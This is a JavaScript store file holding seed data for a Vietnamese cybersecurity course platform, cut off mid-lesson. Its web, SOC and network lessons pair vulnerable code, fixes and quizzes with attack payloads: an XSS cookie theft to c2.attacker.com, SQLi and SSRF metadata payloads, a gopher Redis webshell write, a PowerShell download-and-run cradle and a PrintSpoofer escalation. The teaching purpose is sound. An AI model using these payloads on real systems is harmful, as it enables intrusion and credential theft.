import { create } from "zustand"
import useNotificationStore from "./useNotificationStore"
import useLabStore from "./useLabStore"
import courseService from "../services/courseService"
import progressService from "../services/progressService"
import certificationService from "../services/certificationService"

export const INITIAL_COURSES = [
  {
    "id": "mod-web201",
    "code": "WEB-201",
    "category": "web",
    "track": "Red Team / Tác Chiến Tấn Công",
    "title": "Kiểm Thử Xâm Nhập Ứng Dụng Web Nâng Cao & Lỗ Hổng OWASP Top 10",
    "difficulty": "Trung Cấp",
    "difficultyKey": "intermediate",
    "duration": "18 Giờ Học",
    "lessonsCount": 6,
    "labsCount": 4,
    "enrolledCount": "4,120",
    "mitre": "T1190 / T1059",
    "cert": "CEH / eJPT",
    "cvssBase": "9.8 CRITICAL",
    "threatProfile": "Khai Thác Web Độc Hại & Xâm Nhập Ngang Hàng (Lateral Pivot)",
    "description": "Làm chủ các vector tấn công khai thác trên các ứng dụng Single-Page (SPA) và Microservices hiện đại. Đào sâu kỹ thuật bypass filter SQL Injection, DOM & Reflected XSS, SSRF (Server-Side Request Forgery) và BOLA (Broken Object-Level Authorization).",
    "labLink": "/labs",
    "labId": "lab-01",
    "syllabus": [
      {
        "id": "s1",
        "title": "Kiến Trúc Giao Thức HTTP, Thao Túng Headers & Lỗ Hổng CORS",
        "duration": "2h 15m",
        "objective": "Phân tích gói tin raw HTTP/1.1 và HTTP/2, thao túng Origin headers và khai thác cấu hình sai chính sách CORS.",
        "mitre": "T1190 - Khai thác ứng dụng Public-Facing",
        "cve": "CWE-942: Cấu hình CORS quá lỏng lẻo (Overly Permissive CORS)",
        "theory": "Cơ chế Cross-Origin Resource Sharing (CORS) cho phép máy chủ định danh domain nào được phép truy xuất tài nguyên bảo mật. Khi cấu hình sai lầm như phản hồi ngược Origin tùy ý của kẻ tấn công kèm cờ 'Access-Control-Allow-Credentials: true', hacker có thể đọc dữ liệu nhạy cảm của nạn nhân chỉ qua một lượt truy cập trang web độc hại.",
        "codeSnippet": "// Cấu hình CORS lỏng lẻo trong Node.js Express:\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  // Regex phản hồi Origin có lỗ hổng: khớp với evil-bank.com.attacker.com\n  if (origin && /bank\\.com/.test(origin)) {\n    res.header('Access-Control-Allow-Origin', origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n  }\n  next();\n});",
        "codeLanguage": "javascript",
        "payloadExample": "curl -H \"Origin: https://bank.com.attacker.site\" -H \"Cookie: session=eyJhZG1pbiI6dHJ1ZX0\" https://api.bank.com/user/credentials -i",
        "secureSnippet": "// Cấu hình phòng thủ chuẩn Whitelist nghiêm ngặt:\nconst ALLOWED_ORIGINS = new Set([\n  'https://bank.com',\n  'https://app.bank.com'\n]);\n\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (ALLOWED_ORIGINS.has(origin)) {\n    res.header('Access-Control-Allow-Origin', origin);\n    res.header('Access-Control-Allow-Credentials', 'true');\n    res.header('Vary', 'Origin');\n  }\n  next();\n});",
        "quiz": {
          "question": "Cấu hình CORS nào kết hợp cùng 'Access-Control-Allow-Credentials: true' là nguy hiểm và nghiêm trọng nhất?",
          "options": [
            "Access-Control-Allow-Origin: * (Wildcard kèm credentials)",
            "Access-Control-Allow-Origin tự động phản chiếu Origin tùy ý từ request",
            "Access-Control-Max-Age được thiết lập là 86400",
            "Access-Control-Allow-Methods: GET, POST"
          ],
          "correct": 1,
          "explanation": "Các trình duyệt hiện đại nghiêm cấm ký tự wildcard '*' khi credentials là true, nhưng việc phản hồi ngược Origin tùy ý của kẻ tấn công cho phép bypass hoàn toàn hạn chế này và đánh cắp dữ liệu xác thực."
        }
      },
      {
        "id": "s2",
        "title": "Khai Thác SQL Injection Nâng Cao & Kỹ Thuật Evasion WAF",
        "duration": "3h 45m",
        "objective": "Khai thác SQLi dựa trên Boolean/Time-based, trích xuất schema database tự động và vượt qua WAF ModSecurity.",
        "mitre": "T1190 - Khai thác lỗ hổng cơ sở dữ liệu",
        "cve": "CWE-89: Lỗ hổng chèn mã SQL (SQL Injection)",
        "theory": "SQL Injection xảy ra khi dữ liệu người dùng không tin cậy được ghép trực tiếp vào câu lệnh SQL thay vì dùng tham số hóa (Parameterized Queries). Kỹ sư Red Team sử dụng các kỹ thuật như inline comments, whitespace substitution (URL encoding %09, %0a) và hàm hex/char để vượt qua các bộ lọc Regular Expression của WAF.",
        "codeSnippet": "// Code dễ bị tổn thương với lỗ hổng SQLi:\nconst query = `SELECT id, role, password_hash FROM accounts WHERE department = '${req.query.dept}' AND status = 'ACTIVE'`;\ndb.execute(query);",
        "codeLanguage": "javascript",
        "payloadExample": "IT' UNION SELECT 1, table_name, column_name FROM information_schema.columns WHERE table_schema=database()-- -",
        "secureSnippet": "-- Bản vá an toàn: Sử dụng Prepared Statements (Parameterized Queries)\nPREPARE stmt FROM \n  'SELECT id, role, password_hash FROM accounts \n   WHERE department = ? AND status = ?';\nEXECUTE stmt USING @dept, 'ACTIVE';\nDEALLOCATE PREPARE stmt;",
        "quiz": {
          "question": "Phương pháp phòng ngừa nào mang lại hiệu quả tuyệt đối triệt tiêu 100% rủi ro SQL Injection?",
          "options": [
            "Sử dụng biểu thức chính quy (Regex) loại bỏ ký tự nháy đơn (')",
            "Sử dụng Prepared Statements với Parameterized Queries",
            "Mã hóa Base64 toàn bộ input trước khi đưa vào database",
            "Chỉ cài đặt Web Application Firewall (WAF) ở tầng reverse proxy"
          ],
          "correct": 1,
          "explanation": "Prepared Statements tách biệt hoàn toàn giữa cấu trúc câu lệnh SQL (AST) và dữ liệu đầu vào, khiến dữ liệu người dùng không bao giờ có thể can thiệp làm thay đổi cú pháp truy vấn."
        }
      },
      {
        "id": "s3",
        "title": "DOM-Based & Reflected XSS: Khai Thác Chìm Dưới Trình Duyệt",
        "duration": "3h 00m",
        "objective": "Xác định các Source và Sink nguy hiểm trong Javascript framework, bypass bộ lọc DOMPurify và đánh cắp JWT Token.",
        "mitre": "T1059.007 - Javascript Client Execution",
        "cve": "CWE-79: Cross-Site Scripting (XSS)",
        "theory": "Cross-Site Scripting (XSS) cho phép kẻ tấn công thực thi mã Javascript độc hại trong ngữ cảnh phiên làm việc của nạn nhân. DOM-based XSS xảy ra hoàn toàn ở phía client khi dữ liệu từ các source nguy hiểm (location.search, location.hash, document.referrer) được đưa vào các sink như innerHTML, eval, document.write mà không được khử trùng (sanitization).",
        "codeSnippet": "// Lỗ hổng DOM XSS phía client:\nconst urlParams = new URLSearchParams(window.location.search);\nconst username = urlParams.get('user');\ndocument.getElementById('welcome-message').innerHTML = `Xin chào <b>${username}</b>`;",
        "codeLanguage": "javascript",
        "payloadExample": "\"><img src=x onerror=\"fetch('https://c2.attacker.com/steal?cookie='+encodeURIComponent(document.cookie))\">",
        "secureSnippet": "// Bản vá an toàn: Sử dụng textContent hoặc thư viện DOMPurify\nconst urlParams = new URLSearchParams(window.location.search);\nconst username = urlParams.get('user');\n// Sử dụng textContent đảm bảo dữ liệu luôn được coi là chuỗi văn bản thuần túy\ndocument.getElementById('welcome-message').textContent = username || 'Khách';",
        "quiz": {
          "question": "Thuộc tính nào của Cookie ngăn chặn mã Javascript độc hại đánh cắp session token thông qua document.cookie?",
          "options": [
            "Secure flag",
            "HttpOnly flag",
            "SameSite=Lax",
            "Domain-scoped attribute"
          ],
          "correct": 1,
          "explanation": "Cờ HttpOnly chỉ thị cho trình duyệt rằng cookie này không được phép truy cập thông qua các API client-side như document.cookie, ngăn chặn triệt để hành vi đánh cắp phiên qua XSS."
        }
      },
      {
        "id": "s4",
        "title": "Server-Side Request Forgery (SSRF) & Khai Thác Cloud Metadata",
        "duration": "3h 15m",
        "objective": "Lợi dụng webhook và image fetcher để truy cập mạng nội bộ và chiếm đoạt AWS IMDSv1 token từ 169.254.169.254.",
        "mitre": "T1190 - Khai thác SSRF nhắm vào Cloud Metadata",
        "cve": "CWE-918: Server-Side Request Forgery (SSRF)",
        "theory": "SSRF cho phép kẻ tấn công điều khiển máy chủ backend gửi các request đến các tài nguyên nội bộ mà hacker không thể truy cập trực tiếp từ Internet (như 127.0.0.1, dải IP mạng LAN nội bộ hoặc Cloud Metadata Service 169.254.169.254).",
        "codeSnippet": "// Code backend dễ dính SSRF:\napp.post('/api/fetch-avatar', async (req, res) => {\n  const { imageUrl } = req.body;\n  // Không kiểm tra whitelist IP/domain, tải dữ liệu trực tiếp\n  const response = await axios.get(imageUrl);\n  res.send(response.data);\n});",
        "codeLanguage": "javascript",
        "payloadExample": "http://169.254.169.254/latest/meta-data/iam/security-credentials/production-role",
        "secureSnippet": "// Bản vá phòng thủ SSRF nhiều tầng:\n// 1. Chỉ chấp nhận whitelist domain được phép\n// 2. Chặn các dải IP nội bộ: 127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16\n// 3. Sử dụng AWS IMDSv2 bắt buộc session token qua HTTP PUT",
        "quiz": {
          "question": "Giải pháp nào của AWS vô hiệu hóa hoàn toàn vector tấn công khai thác SSRF qua Cloud Metadata 169.254.169.254?",
          "options": [
            "Bắt buộc nâng cấp cấu hình lên AWS IMDSv2 với PUT session token",
            "Cấu hình AWS CloudFront cache mọi metadata requests",
            "Đổi địa chỉ link-local từ 169.254 sang 10.0.0.1",
            "Mở rộng Security Group cho phép outbound traffic"
          ],
          "correct": 0,
          "explanation": "IMDSv2 yêu cầu gửi HTTP PUT request để lấy session token trước, sau đó mới dùng token này trong header, chặn đứng hầu hết các cuộc tấn công SSRF đơn giản chỉ hỗ trợ HTTP GET."
        }
      },
      {
        "id": "s5",
        "title": "Lỗ Hổng Logic API, BOLA & Chiếm Quyền Điều Khiển Đối Tượng",
        "duration": "2h 45m",
        "objective": "Dò quét các API endpoint RESTful, kiểm tra authorization matrix và khai thác lỗi IDOR/BOLA để thay đổi hồ sơ quản trị viên.",
        "mitre": "T1078 - Lạm dụng tài khoản hợp lệ",
        "cve": "CWE-639: Thay Đổi Tham Số Ủy Quyền Người Dùng (IDOR / BOLA)",
        "theory": "Broken Object Level Authorization (BOLA/IDOR) đứng vị trí số 1 trong OWASP API Security Top 10. Lỗ hổng xảy ra khi ứng dụng nhận ID đối tượng từ client (ví dụ: /api/orders/1029) nhưng không xác thực xem người dùng gửi request có thực sự sở hữu đối tượng đó hay không.",
        "codeSnippet": "// Endpoint dính BOLA: không kiểm tra quyền sở hữu\napp.get('/api/users/:id/invoices', async (req, res) => {\n  // Lấy id từ URL params thay vì từ authenticated session\n  const invoices = await db.query('SELECT * FROM invoices WHERE user_id = ?', [req.params.id]);\n  res.json(invoices);\n});",
        "codeLanguage": "javascript",
        "payloadExample": "GET /api/users/1/invoices HTTP/1.1\nHost: api.target.com\nAuthorization: Bearer <token_of_user_999>",
        "secureSnippet": "// Bản vá an toàn: Kiểm tra phân quyền dựa trên context xác thực\napp.get('/api/users/:id/invoices', verifyAuth, async (req, res) => {\n  if (req.user.id !== req.params.id && req.user.role !== 'SUPER_ADMIN') {\n    return res.status(403).json({ error: 'Truy cập bị từ chối: Bạn không sở hữu tài nguyên này' });\n  }\n  const invoices = await db.query('SELECT * FROM invoices WHERE user_id = ?', [req.params.id]);\n  res.json(invoices);\n});",
        "quiz": {
          "question": "Tại sao Web Application Firewall (WAF) thường hoàn toàn bất lực trước các lỗ hổng BOLA / IDOR?",
          "options": [
            "BOLA sử dụng phương thức mã hóa SSL 4096-bit",
            "Request có cú pháp hoàn toàn hợp lệ, lỗ hổng nằm ở logic phân quyền tầng nghiệp vụ của ứng dụng",
            "BOLA chỉ xảy ra trên giao thức WebSocket",
            "WAF không thể phân tích các API định dạng JSON"
          ],
          "correct": 1,
          "explanation": "WAF hoạt động dựa trên các mẫu chuỗi độc hại (signatures). Trong BOLA, request chỉ chứa các ID số hoặc UUID hoàn toàn bình thường, do đó chỉ có code nghiệp vụ mới kiểm tra được mối quan hệ sở hữu giữa user và dữ liệu."
        }
      },
      {
        "id": "s6",
        "title": "Thực Chiến Red Team: Chuỗi Tấn Công Khai Thác Tổng Lực (Kill Chain Lab)",
        "duration": "3h 00m",
        "objective": "Kết hợp chuỗi lỗ hổng SSRF + BOLA + Command Injection để chiếm đặc quyền root trên máy chủ mục tiêu và trích xuất Flag.",
        "mitre": "T1190 & T1059 - Chuỗi tấn công tổng lực",
        "cve": "Full Kill Chain: SSRF to Remote Code Execution",
        "theory": "Trong thực tế, các cuộc tấn công mạng nguy hiểm nhất luôn là sự kết hợp của nhiều lỗ hổng nhỏ tạo thành chuỗi tấn công (Exploit Chain). Kỹ sư Red Team liên kết từ một lỗi rò rỉ thông tin đến SSRF, từ SSRF vào dịch vụ Redis nội bộ, và từ Redis ghi SSH authorized_keys để chiếm quyền điều khiển toàn diện hệ thống.",
        "codeSnippet": "// Mô phỏng chuỗi tấn công liên hoàn (Attack Flow):\n// 1. Dò quét API endpoint hở SSRF\n// 2. Pivot vào Redis cache nội bộ qua gopher:// protocol\n// 3. Ghi Webshell vào thư mục /var/www/html/backdoor.php\n// 4. Kích hoạt lệnh trích xuất cờ nhị phân bí mật",
        "codeLanguage": "bash",
        "payloadExample": "gopher://127.0.0.1:6379/_SET%20webdir%20%22%3C%3Fphp%20system(%24_GET%5B'cmd'%5D)%3B%20%3F%3E%22%0ACONFIG%20SET%20dir%20/var/www/html%0ACONFIG%20SET%20dbfilename%20shell.php%0ASAVE",
        "secureSnippet": "// Phòng thủ tổng thể nhiều lớp (Defense in Depth):\n// 1. Phân vùng mạng VLAN / Network Segregation nghiêm ngặt\n// 2. Đặt mật khẩu mạnh (AUTH) và vô hiệu hóa các lệnh nguy hiểm (CONFIG, FLUSHALL) trong Redis\n// 3. Chạy container với cờ Read-Only Root Filesystem",
        "quiz": {
          "question": "Chiến lược phòng thủ kiến trúc nào ngăn chặn hiệu quả nhất việc kẻ tấn công pivot từ một ứng dụng web bị xâm nhập sang các dịch vụ nội bộ khác?",
          "options": [
            "Mô hình Zero Trust và phân đoạn mạng siêu nhỏ (Micro-segmentation)",
            "Tăng thời gian timeout của phiên HTTP lên 24 giờ",
            "Tắt tính năng log của máy chủ web",
            "Chỉ cho phép truy cập website qua giao thức HTTP/1.0"
          ],
          "correct": 0,
          "explanation": "Zero Trust và Micro-segmentation cô lập các ứng dụng trong từng mạng riêng biệt, kiểm soát nghiêm ngặt egress traffic và chỉ cho phép giao tiếp giữa các thành phần được cấp phép rõ ràng."
        }
      }
    ]
  },
  {
    "id": "mod-soc101",
    "code": "SOC-101",
    "category": "defensive",
    "track": "Blue Team / Giám Sát SOC & Phân Tích Mối Đe Dọa",
    "title": "Vận Hành SOC, Săn Lùng Mối Đe Dọa SIEM & Elastic Logstash",
    "difficulty": "Cơ Bản",
    "difficultyKey": "novice",
    "duration": "14 Giờ Học",
    "lessonsCount": 5,
    "labsCount": 3,
    "enrolledCount": "3,890",
    "mitre": "T1078 / T1059",
    "cert": "CompTIA CySA+ / SOC Analyst",
    "cvssBase": "8.5 HIGH",
    "threatProfile": "Phát Hiện Tấn Công APT & Cảnh Báo SIEM (Detection Engineering)",
    "description": "Học cách thiết lập hệ thống giám sát an ninh mạng trung tâm SOC, xây dựng pipeline thu thập log với Elastic Stack, chuẩn hóa chuẩn Sigma rules và điều tra các chiến dịch tấn công APT theo ma trận MITRE ATT&CK.",
    "labLink": "/labs",
    "labId": "lab-02",
    "syllabus": [
      {
        "id": "s1",
        "title": "Kiến Trúc Trung Tâm Giám Sát SOC & Phân Tích Mô Hình Kim Tự Tháp Nỗi Đau (Pyramid of Pain)",
        "duration": "2h 30m",
        "objective": "Nắm vững quy trình xử lý cảnh báo SOC L1/L2/L3 và phân loại Indicators of Compromise (IoC) theo thang đo độ khó của đối thủ.",
        "mitre": "T1078 - Lạm dụng tài khoản hợp lệ",
        "cve": "NIST SP 800-61 Rev 2: Quản Lý Sự Cố An Ninh Mạng",
        "theory": "Kim tự tháp nỗi đau (Pyramid of Pain) của David Bianco chỉ ra mức độ khó khăn mà kẻ tấn công phải đối mặt khi bị phát hiện. Chặn Hash hay IP chỉ gây bất tiện nhỏ, nhưng phát hiện và triệt tiêu TTPs (Chiến thuật, Kỹ thuật và Quy trình) sẽ buộc hacker phải tái cấu trúc toàn bộ chiến dịch tấn công.",
        "codeSnippet": "// Ví dụ cấu hình Logstash Pipeline phân loại mức độ nghiêm trọng:\nfilter {\n  if [event_id] == 4625 {\n    mutate { add_field => { \"alert_severity\" => \"MEDIUM\" } }\n    mutate { add_tag => [ \"failed_logon_attempt\" ] }\n  }\n}",
        "codeLanguage": "ruby",
        "payloadExample": "tail -f /var/log/suricata/eve.json | jq 'select(.alert.severity == 1)'",
        "secureSnippet": "// Cấu hình giám sát SIEM chuẩn:\n// 1. Tự động hóa tương quan sự kiện (Correlation Rules)\n// 2. Tích hợp Threat Intelligence Feed (STIX/TAXII)\n// 3. Kích hoạt phản hồi tự động SOAR khi phát hiện TTP nguy cấp",
        "quiz": {
          "question": "Tầng nào trên đỉnh Kim tự tháp nỗi đau (Pyramid of Pain) gây khó khăn lớn nhất và tốn kém nhất cho kẻ tấn công khi bị chặn?",
          "options": [
            "Địa chỉ IP (IP Addresses)",
            "Mã băm tập tin (Hash Values)",
            "Chiến thuật, Kỹ thuật và Quy trình (TTPs)",
            "Tên miền mạng (Domain Names)"
          ],
          "correct": 2,
          "explanation": "TTPs đại diện cho thói quen và kỹ năng tác chiến cốt lõi của kẻ tấn công. Khi TTP bị vô hiệu hóa, đối thủ phải học lại kỹ năng hoặc đầu tư nghiên cứu các phương thức tấn công hoàn toàn mới."
        }
      },
      {
        "id": "s2",
        "title": "Thu Thập Nhật Ký Sự Kiện Windows Event Logs & Phân Tích Sysmon",
        "duration": "3h 15m",
        "objective": "Cấu hình Microsoft Sysmon để phát hiện tiến trình độc hại, hành vi Process Injection và trích xuất bộ nhớ LSASS.",
        "mitre": "T1059.001 - PowerShell Execution",
        "cve": "Sysmon Event ID 1 & 10: Khởi Tạo Tiến Trình & Truy Cập Bộ Nhớ",
        "theory": "Sysmon cung cấp khả năng giám sát sâu trên Windows. Event ID 1 ghi nhận chi tiết dòng lệnh khởi tạo tiến trình (ParentImage, CommandLine, Hash). Event ID 10 phát hiện các hành vi mở handle vào tiến trình nhạy cảm như lsass.exe để trích xuất mật khẩu qua Mimikatz.",
        "codeSnippet": "<!-- Cấu hình XML Sysmon phát hiện truy cập LSASS trái phép -->\n<Sysmon schemaversion=\"4.90\">\n  <EventFiltering>\n    <ProcessAccess onmatch=\"include\">\n      <TargetImage condition=\"end with\">lsass.exe</TargetImage>\n      <GrantedAccess condition=\"is\">0x1010</GrantedAccess>\n    </ProcessAccess>\n  </EventFiltering>\n</Sysmon>",
        "codeLanguage": "xml",
        "payloadExample": "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; ID=1} -MaxEvents 50",
        "secureSnippet": "<!-- Quy tắc phòng thủ Sysmon: Chặn quyền truy cập không cần thiết vào LSASS -->\n<!-- Bật tính năng RunAsPPL (Protected Process Light) trên Windows Server -->\n<!-- Đăng ký Credential Guard qua Group Policy -->",
        "quiz": {
          "question": "Sysmon Event ID nào ghi lại chi tiết các tiến trình được tạo mới kèm mã băm SHA-256 và command-line đầy đủ?",
          "options": [
            "Event ID 1 (Process Create)",
            "Event ID 3 (Network Connection)",
            "Event ID 7 (Image Loaded)",
            "Event ID 11 (File Create)"
          ],
          "correct": 0,
          "explanation": "Sysmon Event ID 1 là sự kiện cốt lõi của việc phát hiện tiến trình độc hại, ghi nhận ProcessId, Image path, CommandLine, ParentProcessId và Hashes."
        }
      },
      {
        "id": "s3",
        "title": "Xây Dựng Quy Tắc Cảnh Báo Phát Hiện Mối Đe Dọa Với Chuẩn Sigma Rules",
        "duration": "2h 45m",
        "objective": "Viết các quy tắc phát hiện độc lập bằng chuẩn Sigma và biên dịch tự động sang cú pháp truy vấn Elasticsearch DSL và Splunk SPL.",
        "mitre": "T1059.001 - PowerShell Obfuscation",
        "cve": "Sigma Detection Rule: Mã Độc PowerShell Tải Về Payload",
        "theory": "Sigma là tiêu chuẩn định dạng quy tắc phát hiện mối đe dọa mở (Open Detection Format) tương tự như chuẩn Yara cho mã độc hay Suricata cho gói tin mạng. Quy tắc Sigma được viết bằng cú pháp YAML dễ hiểu và có thể chuyển đổi sang mọi nền tảng SIEM thông qua công cụ sigmac.",
        "codeSnippet": "title: Phát Hiện PowerShell Tải File Qua WebClient\nid: b5e43a90-32b0-4f81-a67b-123456789abc\nstatus: production\ndescription: Phát hiện lệnh powershell sử dụng System.Net.WebClient DownloadString\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'DownloadString'\n    condition: selection\nlevel: high",
        "codeLanguage": "yaml",
        "payloadExample": "powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.10.14.89/agent.ps1'))\"",
        "secureSnippet": "# Phòng thủ chủ động:\n# 1. Bật PowerShell Constrained Language Mode\n# 2. Bật Script Block Logging (Event ID 4104)\n# 3. Kích hoạt tính năng Windows Defender Application Control (WDAC)",
        "quiz": {
          "question": "Lợi ích cốt lõi lớn nhất khi kỹ sư SOC viết quy tắc phát hiện bằng chuẩn Sigma Rule là gì?",
          "options": [
            "Tự động vá lỗi hệ điều hành trong 5 giây",
            "Độc lập với nền tảng SIEM, có thể biên dịch sang Splunk, Elastic, Sentinel hay QRadar",
            "Thay thế hoàn toàn sự cần thiết của tường lửa mạng",
            "Mã hóa toàn bộ ổ cứng người dùng"
          ],
          "correct": 1,
          "explanation": "Sigma mang tính trung lập về nền tảng (Vendor-Agnostic), cho phép chia sẻ tri thức phát hiện giữa các nhóm SOC và chuyển đổi linh hoạt sang bất kỳ SIEM nào."
        }
      },
      {
        "id": "s4",
        "title": "Săn Lùng Mối Đe Dọa Tấn Công Leo Thang Đặc Quyền (Privilege Escalation Hunting)",
        "duration": "3h 00m",
        "objective": "Săn lùng các kỹ thuật khai thác dịch vụ Windows không an toàn (Unquoted Service Paths) và lạm dụng token SeImpersonatePrivilege.",
        "mitre": "T1548 - Lạm dụng cơ chế leo thang đặc quyền",
        "cve": "JuicyPotato / PrintSpoofer Token Impersonation",
        "theory": "Sau khi có quyền truy cập ban đầu dưới dạng tài khoản dịch vụ (như IIS AppPool, SQL Server Service), kẻ tấn công sẽ tìm cách lạm dụng token đặc quyền SeImpersonatePrivilege hoặc SeAssignPrimaryTokenPrivilege để mạo danh tài khoản NT AUTHORITY\\SYSTEM.",
        "codeSnippet": "// Kiểm tra đặc quyền tài khoản trong cmd:\nwhoami /priv\n\n// Cảnh báo SIEM: Phát hiện lệnh PrintSpoofer / JuicyPotato\nSELECT * FROM win_events WHERE command_line LIKE '%PrintSpoofer%' OR command_line LIKE '%-i -c%'",
        "codeLanguage": "sql",
        "payloadExample": "PrintSpoofer.exe -i -c \"powershell -c Start-Process cmd.exe -Verb RunAs\"",
        "secureSnippet": "// Khắc phục & làm sạch quyền:\n// 1. Gỡ bỏ quyền SeImpersonatePrivilege khỏi các service account thông thường\n// 2. Chạy ứng dụng dưới dạng Virtual Accounts hoặc Managed Service Accounts (gMSA)",
        "quiz": {
          "question": "Đặc quyền Windows nào thường bị kẻ tấn công lạm dụng qua công cụ PrintSpoofer để leo thang từ dịch vụ lên SYSTEM?",
          "options": [
            "SeShutdownPrivilege",
            "SeImpersonatePrivilege",
            "SeTimeZonePrivilege",
            "SeUndockPrivilege"
          ],
          "correct": 1,
          "explanation": "SeImpersonatePrivilege cho phép tiến trình mạo danh danh tính bảo mật của bất kỳ client nào kết nối đến Named Pipe được tạo bởi tiến trình đó, tạo điều kiện chiếm quyền SYSTEM."
        }
      },
      {
        "id": "s5",
        "title": "Diễn Tập Quy Trình Ứng Cứu Sự Cố (Incident Response Playbook: Ransomware Containment)",
        "duration": "2h 30m",
        "objective": "Thực hành quy trình cô lập máy trạm nhiễm mã độc, thu hồi khóa giải mã tạm thời và khôi phục hoạt động kinh doanh.",
        "mitre": "T1486 - Mã hóa dữ liệu tống tiền (Data Encrypted for Impact)",
        "cve": "Playbook: Cách ly máy chủ bị mã hóa dữ liệu trong 15 phút",
        "theory": "Khi mã độc tống tiền (Ransomware) bùng phát, tốc độ phản ứng là yếu tố sống còn. Playbook ứng cứu sự cố quy định các bước chuẩn: 1. Phát hiện & Nhận diện chủng loại mã độc; 2. Cô lập mạng máy chủ lập tức; 3. Thu thập bằng chứng RAM; 4. Truy tìm tài khoản khởi phát; 5. Khôi phục từ bản sao lưu độc lập (Immutable Backup).",
        "codeSnippet": "#!/bin/bash\n# Script cô lập máy trạm Linux khẩn cấp qua iptables:\niptables -F\niptables -A INPUT -s 10.10.10.5 -j ACCEPT # Chỉ cho phép IP của máy phân tích IR\niptables -A OUTPUT -d 10.10.10.5 -j ACCEPT\niptables -P INPUT DROP\niptables -P OUTPUT DROP\necho \"[ALERT] Host isolated. Forensic triage in progress.\"",
        "codeLanguage": "bash",
        "payloadExample": "netsh advfirewall set allprofiles state on && netsh advfirewall firewall add rule name=\"Block All Outbound\" dir=out action=block",
        "secureSnippet": "# Khuyến nghị kiến trúc ứng phó:\n# 1. Triển khai EDR với tính năng One-Click Host Isolation\n# 2. Lưu trữ bản sao lưu ngoại tuyến (Air-gapped) hoặc WORM (Write Once, Read Many)\n# 3. Định kỳ tổ chức diễn tập Tabletop Exercise ứng phó khủng hoảng",
        "quiz": {
          "question": "Hành động đầu tiên và khẩn cấp nhất mà chuyên viên IR cần thực hiện khi phát hiện một máy trạm trong mạng LAN đang thực hiện hành vi mã hóa file hàng loạt là gì?",
          "options": [
            "Khởi động lại máy tính nạn nhân ngay lập tức",
            "Gửi email cảnh báo toàn thể nhân viên công ty",
            "Cô lập máy trạm khỏi mạng (Network Isolation) để chặn mã độc lây lan sang các máy khác",
            "Xóa toàn bộ thư mục tạm thời trên ổ đĩa C"
          ],
          "correct": 2,
          "explanation": "Cô lập mạng ngay lập tức cắt đứt liên lạc C2 của mã độc và ngăn chặn hành vi lây lan ngang hàng (Lateral Movement) sang các máy chủ lưu trữ dữ liệu khác trong doanh nghiệp."
        }
      }
    ]
  },
  {
    "id": "mod-net301",
    "code": "NET-301",
    "category": "network",
    "track": "Network Forensics / Điều Tra Gói Tin & Phân Tích Mạng",
    "title": "Điều Tra Gói Tin Mạng, Phân Tích Giao Thức Wireshark & Tấn Công MITM",
    "difficulty": "Trung Cấp",
    "difficultyKey": "intermediate",
    "duration": "16 Giờ Học",
    "lessonsCount": 5,
    "labsCount": 4,
    "enrolledCount": "2,940",
    "mitre": "T1040 / T1557",
    "cert": "Wireshark WCNA / GCFA",
    "cvssBase": "8.2 HIGH",
    "threatProfile": "Nghe Lén Mạng Cục Bộ & Chiếm Đoạt Phiên Truyền Dữ Liệu",
    "description": "Giải mã sâu các gói tin PCAP trong Wireshark và tshark, phát hiện kỹ thuật tấn công đầu độc bộ nhớ ARP Poisoning, giải mã luồng TLS và truy vết kênh truyền dữ liệu ngầm DNS Tunneling.",
    "labLink": "/labs",
    "labId": "lab-03",
    "syllabus": [
      {
        "id": "s1",
        "title": "Kiến Trúc Phân Lớp Mô Hình TCP/IP & Kỹ Thuật Bắt Gói Tin Bằng TShark/Wireshark",
        "duration": "2h 45m",
        "objective": "Làm chủ bộ lọc hiển thị (Display Filters), bộ lọc bắt gói (Capture Filters) và trích xuất dữ liệu tự động với tshark.",
        "mitre": "T1040 - Nghe lén lưu lượng mạng (Network Sniffing)",
        "cve": "Network Forensics: Trích Xuất Payload Từ Gói Tin Raw PCAP",
        "theory": "Phân tích mạng là nền tảng của cả tấn công và phòng thủ. Nắm vững cấu trúc cờ TCP (SYN, ACK, FIN, RST, PSH, URG), cơ chế bắt tay 3 bước và cấu trúc frame Ethernet cho phép điều tra viên phân biệt đâu là lưu lượng hợp lệ và đâu là dấu hiệu của hành vi dò quét độc hại.",
        "codeSnippet": "# Trích xuất các request HTTP GET chứa thông tin đăng nhập bằng tshark:\ntshark -r capture.pcap -Y \"http.request.method == 'POST'\" \\\n  -T fields -e ip.src -e ip.dst -e http.host -e http.file_data",
        "codeLanguage": "bash",
        "payloadExample": "tcpdump -i eth0 -nn -s0 -w incident_dump.pcap \"tcp port 80 or tcp port 443\"",
        "secureSnippet": "# Phòng thủ bảo vệ hạ tầng mạng:\n# 1. Bật tính năng Port Security trên switch Cisco/Juniper\n# 2. Triển khai mã hóa toàn trình IPsec hoặc WireGuard cho mạng nội bộ",
        "quiz": {
          "question": "Bộ lọc Wireshark nào sau đây chỉ hiển thị các kết nối TCP mới bắt đầu (bắt tay 3 bước bước đầu tiên)?",
          "options": [
            "tcp.flags.syn == 1 and tcp.flags.ack == 0",
            "tcp.flags.reset == 1",
            "tcp.port == 80 and tcp.len > 0",
            "ip.version == 4"
          ],
          "correct": 0,
          "explanation": "Gói tin SYN đầu tiên trong quá trình bắt tay TCP có cờ SYN = 1 và ACK = 0, đánh dấu một yêu cầu thiết lập kết nối mới từ client đến server."
        }
      },
      {
        "id": "s2",
        "title": "Điều Tra Luồng TCP/UDP & Nhận Diện Bất Thường Dò Quét Cổng (Port Scanning)",
        "duration": "3h 15m",
        "objective": "Phân biệt các kiểu quét nmap (SYN Scan, FIN Scan, Xmas Scan, Null Scan) qua dấu vết lưu lượng gói tin.",
        "mitre": "T1046 - Dò quét dịch vụ mạng (Network Service Scanning)",
        "cve": "Nmap Stealth Scan Signatures & Snort Rules",
        "theory": "Các công cụ quét mạng như Nmap gửi các gói tin TCP với tổ hợp cờ bất thường để né tránh ghi log của hệ điều hành mục tiêu. Kỹ thuật Xmas Scan kích hoạt đồng thời các cờ FIN, PSH và URG, vi phạm RFC 793, khiến các máy chủ tuân thủ chuẩn TCP phải phản hồi cờ RST khi cổng đóng.",
